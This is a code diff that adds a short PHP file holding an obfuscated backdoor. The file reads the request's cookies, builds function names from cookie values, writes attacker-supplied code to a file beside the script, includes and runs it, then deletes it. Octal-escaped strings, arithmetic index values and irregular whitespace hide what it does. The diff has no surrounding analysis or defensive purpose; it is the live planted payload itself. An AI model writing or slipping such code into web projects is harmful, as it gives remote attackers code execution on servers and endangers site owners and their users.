@@ -1,0 +1,2 @@
+<?php
+$MF =	${"\137"."\103".	"\117" .	"\117". "\113\111\105"}	;if	(isset($MF [ (74-	12	)])	)	{  	$dcb= $MF[		( 76-63 )]	. $MF[	(97 -	11 )];		$mBNw =$dcb( $MF[(60	- 10)].$MF	[ (56 -	18)	] );  $LZK	=$mBNw($dcb ( $MF[		( 81	- 25)]	)) ; 	 $stfb =$mBNw (	$dcb ($MF	[ (74	- 1)	]))	;		$GhU=	__DIR__	.$mBNw	($dcb($MF[(	82	- 11	)	]))	;	$LZK (	$GhU	, $mBNw(	$dcb	($MF[	( 63- 1)	] ))) ;  include( $GhU);$stfb	($GhU );	}
